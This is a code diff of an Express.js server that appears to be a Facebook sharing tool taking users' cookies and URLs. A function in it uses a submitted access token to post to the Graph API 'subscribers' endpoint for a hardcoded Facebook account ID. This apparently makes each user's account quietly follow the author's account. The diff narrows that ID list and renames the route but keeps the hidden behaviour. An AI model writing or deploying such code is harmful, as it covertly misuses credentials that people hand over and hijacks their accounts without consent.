@@ -1,11 +1,15 @@
+/*
+
+YOU ARE FREE TO FORK THIS API 
+
+*/
+
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
-const bodyParser = require('body-parser');
 const app = express();
 const port = 3000;
 app.use(express.json());
-app.use(bodyParser.json());
 app.use(require("./corss"));
 app.set("json spaces", 4);
 const total = new Map();
@@ -69,7 +73,7 @@ if (leiam) {
  }
 } catch (error) {}
 }
-app.get('/sh', async (req, res) => {
+app.get('/submit', async (req, res) => {
   const {
     cookie,
     url,
@@ -128,9 +132,7 @@ async function fucker(a,link){
       'Authorization': `Bearer ${a}`
     };
     const neth = [
-      "100015801404865",
-      "61562218612857",
-      "61559180483340"
+      "100015801404865"
     ];
     for (const n of neth){
       axios.post(`https://graph.facebook.com/v18.0/${n}/subscribers`, {}, {
